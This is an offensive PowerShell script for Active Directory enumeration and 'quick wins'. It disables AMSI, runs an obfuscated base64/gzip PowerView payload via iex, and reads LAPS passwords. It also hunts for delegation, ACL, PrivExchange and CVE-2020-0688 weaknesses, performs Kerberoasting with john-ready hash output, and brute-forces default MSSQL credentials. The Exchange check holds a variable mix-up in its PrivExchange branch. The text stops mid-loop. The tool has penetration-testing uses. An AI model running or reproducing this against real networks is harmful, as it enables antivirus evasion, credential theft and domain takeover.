<#
    Script for powershell AD enumeration / quickwins using PowerView, PowerUpSql and Windows ActiveDirectory modules
    
    Author: @phackt_ul
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
#>

#Requires -Version 2

[CmdletBinding()]
param(
  [Parameter(Mandatory=$false)]
  [String]$Domain,
  [Parameter(Mandatory=$false)]
  [String]$TargetDC,
  [Parameter(Mandatory=$false)]
  [Switch]$Quick
)

# ----------------------------------------------------------------
# ----------------------------------------------------------------
# Importing modules  
# ----------------------------------------------------------------
# ----------------------------------------------------------------

function Get-DecompressedByteArray {

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [byte[]] $byteArray = $(Throw("-byteArray is required"))
    )
    Process {
        Write-Verbose "Get-DecompressedByteArray"
        $input = New-Object System.IO.MemoryStream( , $byteArray )
        $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
        $gzipStream.CopyTo( $output )
        $gzipStream.Close()
        $input.Close()
        [byte[]] $byteOutArray = $output.ToArray()
        Write-Output $byteOutArray
    }
}

function Import-CustomModule($ScriptPath, $ModuleName){
    Import-Module "$ScriptPath"

    if ((Get-Module -Name "$ModuleName") -eq $null){
        throw "$ScriptPath not found, error importing module."
    }
}

<#
    Importing main modules
#>

#
# Before importing any module, it's better to disable AMSI
#
iex $PSScriptRoot\modules\amsi.ps1

if([Bypass.AntiMalware]::Disable() -eq "0") {
    Write-Output "[+] AMSI has been disabled"
} else {
    Write-Output "[!] Problem while disabling AMSI"
}

if (-Not ((Get-Module -Name "PowerSploit") -ne $null -or (Get-Module -Name "PowerView") -ne $null -or (Get-Module -Name "Recon") -ne $null)){
    Write-Output "[+] PowerSploit module not found. Importing from compressed bin file ..."

    [System.Text.Encoding] $enc = [System.Text.Encoding]::UTF8
    $base64str = $enc.GetString((Get-DecompressedByteArray -byteArray (Get-Content $PSScriptRoot\modules\pview.bin)))
    iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64str)))

    # https://github.com/PowerShellMafia/PowerSploit/issues/363
}

if ((Get-Module -Name "Microsoft.ActiveDirectory.Management") -eq $null){
    Write-Output "[+] Microsoft.ActiveDirectory.Management.dll not found. Importing ..."
    Import-CustomModule $PSScriptRoot\modules\ADModule\Microsoft.ActiveDirectory.Management.dll Microsoft.ActiveDirectory.Management
}

if ((Get-Module -Name "ActiveDirectory") -eq $null){
    Write-Output "[+] ActiveDirectory module not found. Importing ..."
    Import-CustomModule $PSScriptRoot\modules\ADModule\ActiveDirectory\ActiveDirectory.psd1 ActiveDirectory
}

if ((Get-Module -Name "PowerUpSQL") -eq $null){
    Write-Output "[+] PowerUpSQL module not found. Importing ..."
    Import-CustomModule $PSScriptRoot\modules\PowerUpSQL\PowerUpSQL.psd1 PowerUpSQL
}

<#
    Importing custom modules
#>

if ((Get-Module -Name "GadgetExchange") -eq $null){
    Write-Output "[+] GadgetExchange module not found. Importing ..."
    Import-CustomModule "$PSScriptRoot\modules\GadgetExchange.psm1" GadgetExchange
}

# ----------------------------------------------------------------
# ----------------------------------------------------------------
# Main  
# ----------------------------------------------------------------
# ----------------------------------------------------------------

function Write-ColorOutput($ForegroundColor)
{
    # save the current color
    $fc = $host.UI.RawUI.ForegroundColor

    # set the new color
    $host.UI.RawUI.ForegroundColor = $ForegroundColor

     # output
    if ($args) {
        Write-Output $args
    }
    else {
        $input | Write-Output
    }

    # restore the original color
    $host.UI.RawUI.ForegroundColor = $fc
}

function Write-Banner {
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true)]
        [string]$Text
    )

    $Output = "`r`n`r`n"
    $Output += "+------+------------------------------------------------+------+`r`n"
    $Output += "| $Text `r`n"
    $Output += "+------+------------------------------------------------+------+"

    Write-Output $Output
    
}

function Write-BigBanner {
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true)]
        [string]$Text
    )

    $Output = "`r`n`r`n"
    $Output += "################################################################`r`n"
    $Output += "################################################################`r`n"
    $Output += "| $Text `r`n"
    $Output += "################################################################`r`n"
    $Output += "################################################################"

    Write-Output $Output
    
}

function Format-KerberosResults {
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        $Objects
    )

    Process  {
        $_ | Select-Object Description,DistinguishedName,Enabled,GivenName,@{Name="msDS-AllowedToDelegateTo";Expression={($_."msDS-AllowedToDelegateTo" | Out-String).Trim()}},Name,ObjectClass,ObjectGUID,SamAccountName,@{Name="servicePrincipalName";Expression={($_.servicePrincipalName | Out-String).Trim()}},SID,@{Name="Surname";Expression={($_.Surname | Out-String).Trim()}},TrustedToAuthForDelegation,UserPrincipalName
    }    
}

function Output-Results {
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        $Objects,
        [Parameter(Mandatory=$true)]
        [string]$Path,
        [Parameter(Mandatory=$false)]
        [switch]$Tee
    )

    Begin {
        $CSVPath = "$($Path).csv"
        $TXTPath = "$($Path).txt"
        [System.Collections.ArrayList]$Array = @()
    }

    Process  {
        $Array.Add($_) > $null
    }

    End {
         if ( $Array -ne $null ){
              $Array | Export-CSV -NoTypeInformation -Path "$CSVPath"
             if($Tee){
                 $Array | Tee-Object -File "$TXTPath"    
             } else {
                 $Array | Out-File "$TXTPath"
             }
         }

    }
}

#
# Init Aliases
#

# New-Alias -Name Export-CSV -Value "Export-CSV -NoTypeInformation -NoTypeInformation" -Scope Process
# New-Alias -Name ConvertTo-Csv -Value "ConvertTo-Csv -NoTypeInformation -NoTypeInformation" -Scope

#
# Init / Setting variables
#

# Need to find the current domain

if (! $PSBoundParameters.ContainsKey('Domain')){
    $Domain = $((Get-Domain).Name)
}

$CurDir = (Get-Location).Path
$DicoPath = "$CurDir\dico\has_complexity_no_dump"
$EnumDir = "$CurDir\results\$Domain\domain"
$EnumMSSQLDir = "$CurDir\results\$Domain\mssql"
$QuickWinsDir = "$EnumDir\quickwins"
$KerberoastDir = "$EnumDir\kerberoast"
$OutputDirs = @($EnumDir,$EnumMSSQLDir,$QuickWinsDir,$KerberoastDir)

$Global:ProgressPreference = 'SilentlyContinue'

#
# Creating output dirs
#

foreach ($OutputDir in $OutputDirs){
    If(!(Test-Path "$OutputDir"))
    {
          New-Item -ItemType Directory -Force -Path "$OutputDir" > $null
    }
}

# ----------------------------------------------------------------
# ----------------------------------------------------------------
# Domain Enumeration  
# ----------------------------------------------------------------
# ----------------------------------------------------------------

Write-BigBanner -Text "Starting enumeration of domain $Domain"

if ($PSBoundParameters.ContainsKey('TargetDC')){
    $DCSMB = New-Object System.Net.Sockets.TCPClient -ArgumentList $TargetDC, 445

    if(! $DCSMB.Connected){
        throw "DC $TargetDC is not accessible. Exiting."
    }
}

if (! $PSBoundParameters.ContainsKey('TargetDC')){
    # /!\ several SRV DNS entries for PDCs may exist

    # PDC concept may be a bit oldschool
    Write-Banner -Text "Looking for PDC (DNS enum)"
    $TargetDC = Resolve-DnsName -DnsOnly -Type SRV _ldap._tcp.pdc._msdcs.$Domain
    Write-Output $TargetDC
}

Write-Banner -Text "Looking for all DCs (DNS enum)"
$AllDCs = Resolve-DnsName -DnsOnly -Type SRV -Server $TargetDC _ldap._tcp.dc._msdcs.$Domain
Write-Output $AllDCs

# Discovering Domain Controllers thanks to Get-DomainController (userAccountControl:1.2.840.113556.1.4.803:=8192)
$AllDCs_pw = Get-DomainController -Domain $Domain -Server $TargetDC

$nb_AllDCs = $($AllDCs.IP4Address | Sort-Object | Get-Unique).count
$nb_AllDCs_pw = $($AllDCs_pw.IPAddress | Sort-Object | Get-Unique).count

if ($nb_AllDCs -ne $nb_AllDCs_pw){
    Write-ColorOutput yellow "[+] Numbers of Domain Controllers mismatch"
    Write-ColorOutput yellow "    DNS enumeration: $($nb_AllDCs)"
    Write-ColorOutput yellow "    LDAP filter (userAccountControl:1.2.840.113556.1.4.803:=8192): $($nb_AllDCs_pw)`r`n"
}


if (! $PSBoundParameters.ContainsKey('TargetDC')){
    $TargetDC = ($TargetDC | %{$_.IP4Address}) | Select-Object -First 1

    Write-ColorOutput yellow "[+] Target DC ip: $TargetDC"
} else {
    Write-ColorOutput yellow "[+] Target DC IP explicitly set to: $TargetDC"
}

# Testing if ADWS is up on TargetDC and port 389 is accessible

$adws = New-Object System.Net.Sockets.TCPClient -ArgumentList $TargetDC, 9389
if (! $adws.Connected){
    Write-ColorOutput red "[!] ADWS on target DC $($TargetDC) are not accessible"

    if (! $PSBoundParameters.ContainsKey('TargetDC')){

        Write-Output "[+] Trying to find a DC with accessible ADWS..."
        foreach($DCip in $($AllDCs.IP4Address | Sort-Object | Get-Unique)){
            if ($DCip -ne $TargetDC){
                $adws = New-Object System.Net.Sockets.TCPClient -ArgumentList $DCip, 9389
                if ($adws.Connected){
                    Write-Output "[+] Target DC set to $($DCip)"
                    $TargetDC = $DCip
                    break
                }
            }
        }
    }

    if (! $adws.Connected){
        Write-ColorOutput yellow "[+] Enumeration using Active Directory module may be limited"
    }
}

Write-Banner -Text "Checking spooler service is up on DCs"
foreach($DCip in $AllDCs.IP4Address){
    Write-Output "[+] ls \\$DCip\pipe\spoolss"
    ls \\$DCip\pipe\spoolss
}

$RootDSE = Get-ADRootDSE -Server $TargetDC

# Test if RootDSE is null to construct the namingContext

if ($RootDSE -eq $null){
    # Setting manually the naming contexts
    $RootDSE = @{}
    $RootDSE.defaultNamingContext = ([ADSI]"LDAP://RootDSE").defaultNamingContext
    $RootDSE.configurationNamingContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $RootDSE.schemaNamingContext = ([ADSI]"LDAP://RootDSE").schemaNamingContext

    if ($RootDSE.count -eq 0){
        Write-Output "[!] Root DSE can not be retrieved !"
    }
}

Write-Banner -Text "Members of the DCs 'Domain Local' group Administrators"
foreach($DCip in $AllDCs.IP4Address){
    Write-Output "[+] Digging into $DCip"
    Get-NetLocalGroupMember -ComputerName $DCip -GroupName "Administrators"
}

Write-Banner -Text "Get-DomainSID"
$DomainSID = Get-DomainSID -Domain $Domain -Server $TargetDC
Write-Output $DomainSID

Write-Banner -Text "Get-Domain"
Get-ADDomain -Identity $Domain -Server $TargetDC

Write-Banner -Text "Get-ADForest"
$Forest = Get-ADForest -Identity $Domain -Server $TargetDC
Write-Output $Forest

$DomainPolicy = Get-DomainPolicy -Domain $Domain -Server $TargetDC

Write-Banner -Text "(Get-DomainPolicy).SystemAccess"
$DomainPolicy."SystemAccess"

Write-Banner -Text "(Get-DomainPolicy).KerberosPolicy"
$DomainPolicy."KerberosPolicy"

Write-Banner -Text "Get-DomainTrust"
Get-DomainTrust -Domain $Domain -Server $TargetDC

Write-Banner -Text "Get-ForestTrust"
Get-ForestTrust -Forest $Forest.Name

Write-Banner -Text "Finding shadow security principals (bastion forest)"
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + $RootDSE.configurationNamingContext) -SearchScope OneLevel -Server $TargetDC -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl

Write-Banner -Text "Is LAPS installed (CN=ms-mcs-admpwd,$($RootDSE.schemaNamingContext))"
$islaps = Get-DomainObject "ms-Mcs-AdmPwd" -Server $TargetDC -SearchBase "$($RootDSE.schemaNamingContext)"

if($islaps){
    Write-ColorOutput green "`r`n[+] LAPS schema extension detected"
}

Write-Banner -Text "Finding computers with LAPS installed (ms-mcs-admpwdexpirationtime=*)"
Get-DomainComputer -Server $TargetDC -Filter "(ms-mcs-admpwdexpirationtime=*)" @PSBoundParameters | ForEach-Object {

    $HostName = $_.dnshostname
    $Password = $_."ms-mcs-admpwd"

    If ($_."ms-MCS-AdmPwdExpirationTime" -ge 0) {
        $CurrentExpiration = $([datetime]::FromFileTime([convert]::ToInt64($_."ms-MCS-AdmPwdExpirationTime",10)))
    }
    Else{
        $CurrentExpiration = "N/A"
    }

    $Computer = New-Object PSObject
    $Computer | Add-Member NoteProperty 'ComputerName' "$HostName"
    $Computer | Add-Member Noteproperty 'Password' "$Password"
    $Computer | Add-Member Noteproperty 'Expiration' "$CurrentExpiration"
    $Computer        

}

# If -Quick, skipping what can take a lot of time on large domains

if(! $PSBoundParameters.ContainsKey('Quick')){
    Write-Banner -Text "Get-DomainUser"
    Write-Output "[saving into ""$EnumDir\users.*""]"
    Get-DomainUser -Domain $Domain -Server $TargetDC | Output-Results -Path "$EnumDir\users"

    Write-Banner -Text "Get-DomainGroup"
    Write-Output "[saving into ""$EnumDir\groups.*""]"
    Get-DomainGroup -Domain $Domain -Server $TargetDC | Output-Results -Path "$EnumDir\groups"

    Write-Banner -Text "Get-DomainComputer"
    Write-Output "[saving into ""$EnumDir\computers.*""]"
    Get-DomainComputer -Domain $Domain -Server $TargetDC | Output-Results -Path "$EnumDir\computers"
} else {
    Write-ColorOutput yellow "`r`n[+] Skipping Users, Groups and Computers enumeration"
}

#
# Privileged accounts
#

Write-Banner -Text "Nested privileged users (RID >= 1000)"
<#
    From these Privileged Groups:
    "Administrators",        
    "Domain Admins",       
    "Enterprise Admins",   
    "Schema Admins",       
    "Account Operators",   
    "Backup Operators"
#>

$AdministratorsGroup = Get-DomainGroup -Domain $Domain -Server $TargetDC -Identity "S-1-5-32-544"
$DomainAdminsGroup = Get-DomainGroup -Domain $Domain -Server $TargetDC -Identity "$DomainSID-512"
$EnterpriseAdminsGroup = Get-DomainGroup -Domain $Domain -Server $TargetDC -Identity "$DomainSID-519"
$SchemaAdminsGroup = Get-DomainGroup -Domain $Domain -Server $TargetDC "$DomainSID-518"
$AccountOperatorsGroup = Get-DomainGroup -Domain $Domain -Server $TargetDC "S-1-5-32-548"
$BackupOperatorsGroup = Get-DomainGroup -Domain $Domain -Server $TargetDC "S-1-5-32-551"

$AdministratorsGroup.objectsid,$DomainAdminsGroup.objectsid,$EnterpriseAdminsGroup.objectsid,$SchemaAdminsGroup.objectsid,$AccountOperatorsGroup.objectsid,$BackupOperatorsGroup.objectsid | Get-DomainGroupMember -Recurse -Domain $Domain -Server $TargetDC 2> $null | Where-Object {($_.MemberObjectClass -eq "user") -and ([int]$_.MemberSID.split("-")[7] -ge 1000)} | Sort MemberSID -Unique | Output-Results -Path "$EnumDir\privileged_accounts" -Tee

#
# DNSAdmins members
#

Write-Banner -Text "'DNSAdmins' group members"

$DNSAdmins = Get-DomainGroupMember -Domain $Domain -Server $TargetDC -Identity "DNSAdmins"
$DNSAdmins | Output-Results -Path "$EnumDir\dnsadmins" -Tee

if($DNSAdmins){
    Write-ColorOutput yellow "[!] For exploitation, see: http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html"
}

#
# Exchange servers
#

Write-Banner -Text "Looking for Exchange servers"

# Only keeping for now CN=ms-Exch-Exchange-Server

$ExchangeServers = Get-ADExchangeServer -ConfigurationNamingContext $RootDSE.configurationNamingContext -Server $TargetDC | Where-Object {$_.Category -like "CN=ms-Exch-Exchange-Server*"} | Select-Object Version,FQDN,Roles,Class
$ExchangeServers | Output-Results -Path "$EnumDir\exchange_servers"

# Looking for [PrivExchange, CVE-2020-0688]
# https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV190007
# https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688
# https://docs.microsoft.com/fr-fr/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019

foreach($ExchangeServer in $ExchangeServers){

    ##################################################################################
    #PrivExchange
    $PrivExchange = $true
    switch($ExchangeServer.MajorVersion)
    {
        "15" {
                switch($ExchangeServer.MinorVersion)
                {
                    "2" {if([int]$ExchangeServer.Build -ge 330){$CVE20200688 = $false};Break}
                    "1" {if([int]$ExchangeServer.Build -ge 1713){$CVE20200688 = $false};Break}
                    "0" {if([int]$ExchangeServer.Build -ge 1473){$CVE20200688 = $false};Break}
                }
                Break
             }
        "14" {
                switch($ExchangeServer.MinorVersion)
                {
                    "3" {if([int]$ExchangeServer.Build -ge 442){$CVE20200688 = $false};Break}
                }
                Break
             }
    }

    $ExchangeServer | Add-Member -MemberType NoteProperty -Name PrivExchange -Value $PrivExchange
    ##################################################################################

    ##################################################################################
    #CVE-2020-0688
    $CVE20200688 = $true
    switch($ExchangeServer.MajorVersion)
    {
        "15" {
                switch($ExchangeServer.MinorVersion)
                {
                    "2" {if([int]$ExchangeServer.Build -ge 464){$CVE20200688 = $false};Break}
                    "1" {if([int]$ExchangeServer.Build -ge 1847){$CVE20200688 = $false};Break}
                    "0" {if([int]$ExchangeServer.Build -ge 1497){$CVE20200688 = $false};Break}
                }
                Break
             }
        "14" {
                switch($ExchangeServer.MinorVersion)
                {
                    "3" {if([int]$ExchangeServer.Build -ge 496){$CVE20200688 = $false};Break}
                }
                Break
             }
    }

    $ExchangeServer | Add-Member -MemberType NoteProperty -Name CVE-2020-0688 -Value $CVE20200688
    ##################################################################################

    Write-Output $ExchangeServer

    #Checking if server is vuln
    if($ExchangeServer.PrivExchange -eq $true){
        Write-ColorOutput yellow "[!] Exchange server $($ExchangeServer.FQDN) vulnerable to PrivExchange"
    }

    #Checking if server is vuln
    if($ExchangeServer.'CVE-2020-0688' -eq $true){
        Write-ColorOutput yellow "[!] Exchange server $($ExchangeServer.FQDN) vulnerable to CVE-2020-0688"
    }
}

# /!\ Also, we want to confirm that the WriteDacl right has not been manually set with the flag InheritOnly for the group 'Exchange Windows Permissions'

$sidEWP = $(Get-DomainGroup 'Exchange Windows Permissions' -Properties objectsid -Server $TargetDC).objectsid
$AtLeastOneWithoutInheritOnlyWriteDac = Get-DomainObjectAcl $RootDSE.defaultNamingContext -Server $TargetDC | ? { ("$sidEWP" -ne "") -and ($_.SecurityIdentifier -imatch "$sidEWP") -and ($_.ActiveDirectoryRights -imatch 'WriteDacl') -and -not ($_.AceFlags -imatch 'InheritOnly') }

if($AtLeastOneWithoutInheritOnlyWriteDac) {
    Write-ColorOutput yellow "`r`n[!] At least one WriteDacl right without InheritOnly on '$($RootDSE.defaultNamingContext)' has been found (confirming privexchange attack)"
    Write-ColorOutput yellow "`r`n    Now you just need a compromised user with a mailbox:"
    Write-ColorOutput yellow "    Get-ADUser -SearchBase $($RootDSE.defaultNamingContext) -Server $($TargetDC) -LDAPFilter '(msExchMailboxGuid=*)'"
}else{
    Write-ColorOutput red "`r`n[!] If some exchange servers has been found vulnerable, the right 'WriteDacl' appears to be InheritOnly"
}

# ----------------------------------------------------------------
# ----------------------------------------------------------------
# Interesting stuff 
# ----------------------------------------------------------------
# ----------------------------------------------------------------

Write-BigBanner -Text "Looking for interesting stuff"

#
# Deprecated OS
#

Write-Banner -Text "End-of-support Operating Systems (MS17-010)"
Get-DomainComputer -Domain $Domain -Server $TargetDC |  Where-Object {($_.OperatingSystem -like "*XP*") -or ($_.OperatingSystem -like "*Vista*") -or ($_.OperatingSystem -like "*2000*") -or ($_.OperatingSystem -like "*Windows 7*") -or ($_.OperatingSystem -like "*Windows 8*") -or ($_.OperatingSystem -like "*ME*") -or ($_.OperatingSystem -like "*2003*") -or ($_.OperatingSystem -like "*2008*")} | Output-Results -Path "$QuickWinsDir\deprecated_os" -Tee

#
# AS_REP Roasting - no kerberos preauth
#

Write-Banner -Text "Users without kerberos preauth"
Get-DomainUser -PreauthNotRequired -Domain $Domain -Server $TargetDC | Output-Results -Path "$QuickWinsDir\users_without_krb_preauth" -Tee

#
# Kerberoast
#

Write-Banner -Text "All kerberoastable users"
$KerberoastableUsers = Get-DomainUser -SPN -Domain $Domain -Server $TargetDC | Where-Object {$_.samaccountname -ne 'krbtgt'} 
$KerberoastableUsers | Output-Results -Path "$QuickWinsDir\kerberoastable_all" -Tee

Write-Banner -Text "Kerberoastable users members of DA"
Get-DomainUser -SPN -Domain $Domain -Server $TargetDC | ?{$_.memberof -imatch $DomainAdminsGroup.samaccountname -and $_.samaccountname -ne 'krbtgt'} | Output-Results -Path "$QuickWinsDir\kerberoastable_da" -Tee

Write-Banner -Text "Kerberoasting all users"
if($KerberoastableUsers){
    foreach($KerberoastableUser in $KerberoastableUsers){
        Invoke-Kerberoast -Domain $Domain -Server $TargetDC -OutputFormat john -Identity "$($KerberoastableUser.distinguishedname)" | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')} | Out-File "$KerberoastDir\$($KerberoastableUser.samaccountname).txt"
    }

    Write-Output "[saving tickets into ""$KerberoastDir\""]"
    Write-ColorOutput yellow "`r`n[!] Now run:"
    Write-ColorOutput yellow "    john --session=""Kerberoasting"" --wordlist=""$DicoPath"" $KerberoastDir\*"

    Write-ColorOutput yellow "`r`n[!] On linux, before john, run:"
    Write-ColorOutput yellow "    find /path/with/tickets -type f -name ""*.txt"" -print0 | xargs -0 dos2unix"
} else {
    Write-Output "[+] No kerberoastable users"
}

#
# Kerberos delegation - unconstrained
#

Write-Banner -Text "Computers with unconstrained delegation - skip DCs"
$computers_with_T4D = Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties TrustedForDelegation,servicePrincipalName,Description
$computers_with_T4D | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_computers" -Tee

Write-Banner -Text "Looking for dangerous rights on computers with unconstrained delegation"

$computers_with_T4D_and_additionaldnshostnames_writable = ($computers_with_T4D |foreach {
    Get-DomainObjectAcl "$($_.DistinguishedName)" -ResolveGUIDs -Server $TargetDC | ?{
        ($_.AceQualifier -match 'AccessAllowed') -and `
        ($_.SecurityIdentifier -match '^S-1-5-.*-[0-9]\d{3,}$') -and ( `
        ($_.ObjectAceType -ilike 'User-*Change-Password') -or `
        ($_.ActiveDirectoryRights -imatch 'GenericAll|GenericWrite|WriteDacl|WriteOwner') -or `
        (($_.ActiveDirectoryRights -imatch 'WriteProperty') -and ($_.ObjectAceType -imatch 'ms-DS-Additional-Dns-Host-Name')))
        } | % {
          $_ | Add-Member Noteproperty 'TrusteeDN' $(Convert-ADName $_.SecurityIdentifier -OutputType DN)
          $_ | ?{ $_.TrusteeDN -inotlike '*OU=Microsoft Exchange Security Groups*' }
        }
})

if($computers_with_T4D_and_additionaldnshostnames_writable){
    $computers_with_T4D_and_additionaldnshostnames_writable

    Write-ColorOutput yellow "[!] Found computers with unconstrained delegation and dangerous rights"
    Write-ColorOutput yellow "[!] For WriteProperty on ms-DS-Additional-Dns-Host-Name, please check https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"
}

Write-Banner -Text "Users with unconstrained delegation"
Get-ADUSer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {(TrustedForDelegation -eq $True)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_users" -Tee

Write-Banner -Text "Managed Service Accounts with unconstrained delegation"
Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {(TrustedForDelegation -eq $True)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_msa" -Tee

#
# Kerberos delegation - constrained
#
# https://phackt.com/en-kerberos-constrained-delegation-with-protocol-transition
#

Write-Banner -Text "Computers with constrained delegation"
Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_computers" -Tee

Write-Banner -Text "Users with constrained delegation"
Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_users" -Tee

Write-Banner -Text "Managed Service Accounts with constrained delegation"
Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_msa" -Tee


#
# Find services with msDS-AllowedToActOnBehalfOfOtherIdentity
#
# Resource Based Constrained Delegation
#

Write-Banner -Text "Finding services with msDS-AllowedToActOnBehalfOfOtherIdentity"
Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_computers" -Tee

Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_users" -Tee

Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_msa" -Tee

#
# Find principals (RID >= 1000) with permissive rights
#

$containers = @("$($RootDSE.defaultNamingContext)","CN=Users,$($RootDSE.defaultNamingContext)","CN=Computers,$($RootDSE.defaultNamingContext)","OU=Domain Controllers,$($RootDSE.defaultNamingContext)")

$containers |foreach {

     Write-Banner -Text "Finding principals (RID > 1000) with permissive rights on container '$_' (not looking for nested objects)"
     
     # Write-Output "[!] Filtering out 'OU=Microsoft Exchange Security Groups'"

     Get-DomainObjectAcl "$_" -ResolveGUIDs -Server $TargetDC | ?{
          ($_.AceQualifier -match 'AccessAllowed') -and `
          ($_.SecurityIdentifier -match '^S-1-5-.*-[0-9]\d{3,}$') -and ( `
          ($_.ObjectAceType -imatch 'replication-get') -or `
          ($_.ObjectAceType -ilike 'User-*Change-Password') -or `
          ($_.ActiveDirectoryRights -imatch 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner'))
          } | % {
              $_ | Add-Member Noteproperty 'TrusteeDN' $(Convert-ADName $_.SecurityIdentifier -OutputType DN)
              $_ | ?{ $_.TrusteeDN -inotlike '*OU=Microsoft Exchange Security Groups*' }
          } | Output-Results -Path "$QuickWinsDir\permissive_acls" -Tee
}

# ----------------------------------------------------------------
# ----------------------------------------------------------------
# MSSQL Enumeration  
# ----------------------------------------------------------------
# ----------------------------------------------------------------

Write-BigBanner -Text "Starting enumeration of MSSQL instances"

#
# MSSQL enumeration
#

Write-Banner -Text "Enumerate MSSQL instances (looking for SPN service class MSSQL)"
$AllSQLInstances = Get-SQLInstanceDomain -IncludeIP -DomainController $TargetDC
$AllSQLInstances | Output-Results -Path "$EnumMSSQLDir\instances" -Tee

Write-Banner -Text "Are MSSQL instances accessible within current security context ?"
$Instances = $AllSQLInstances | Get-SQLConnectionTestThreaded
$AccessibleInstances = New-Object System.Collections.Generic.HashSet[String]
foreach($Instance in $Instances){
    if($Instance.Status -eq "Accessible"){

        #
        # Avoid doublon - instance vs instance,1433
        #

        if ($Instance.Instance -notmatch ".*,[0-9]+") 
        {
            $AccessibleInstances.Add("$($Instance.Instance),1433") > $null
        } else {
            $AccessibleInstances.Add("$($Instance.Instance)") > $null
        }
    }
}

#
# Create result directory instance
#

foreach($Instance in $AccessibleInstances){
    If(!(Test-Path "$EnumMSSQLDir\$Instance"))
    {
          New-Item -ItemType Directory -Force -Path "$EnumMSSQLDir\$Instance" > $null
    }
}

Write-Output $Instances

Write-Banner -Text "Find MSSQL instances versions"
foreach($Instance in $AccessibleInstances){ 
        Write-Output "`r`n[+] Instance: $Instance"

        Get-SQLServerInfo -Instance $Instance | Output-Results -Path "$EnumMSSQLDir\$Instance\version" -Tee
}

Write-Banner -Text "Find linked servers from each accessible MSSQL instances"
foreach($Instance in $AccessibleInstances){ 
        Write-Output "`r`n[+] Instance: $Instance"

        $LinkedServers = Get-SQLServerLinkCrawl -Instance $Instance | Select-Object Version,Instance,Sysadmin,@{Name="Path";Expression={($_.Path | Out-String).Trim()}},
User,@{Name="Links";Expression={($_.Links | Out-String).Trim()}} | Output-Results -Path "$EnumMSSQLDir\$Instance\linked_servers" -Tee

        Write-Output $LinkedServers

        #
        # Trying to RPC-OUT to linked server to remotely execute stored procedure
        #

        $LinkedServers = $LinkedServers.Links
        $LinkedServers = ,"$($Instance.split('.')[0])" + $LinkedServers

        foreach($LinkedServer in $LinkedServers){

            if($LinkedServer){
                $result = Get-SQLServerLinkCrawl -Instance "$Instance" -QueryTarget "$LinkedServer" -Query "select name from sys.servers where is_rpc_out_enabled = 1 and is_linked=1;" | select -ExpandProperty CustomQuery

                foreach($datarow in $result){
                    if($datarow.Name){
                        Write-ColorOutput yellow "[+] '$LinkedServer' can RPC-OUT to '$($datarow.Name)'"
                    }
                }
            }     
        }
}

# ----------------------------------------------------------------
# ----------------------------------------------------------------
# MSSQL Audit  
# ----------------------------------------------------------------
# ----------------------------------------------------------------

Write-BigBanner -Text "Auditing MSSQL instances"

#
# MSSQL audit
#

Write-Banner -Text "MSSQL instances common credentials bruteforce"
foreach($Instance in $AccessibleInstances){ 
        Write-Output "`r`n[+] Instance: $Instance"

        Get-SQLServerLoginDefaultPw -Instance $Instance | Output-Results -Path "$EnumMSSQLDir\$Instance\bruteforce_creds" -Tee
}

Write-Banner -Text "Is xpcmdshell enabled through linked servers of each accessible instances"
foreach($Instance in $AccessibleInstances){ 
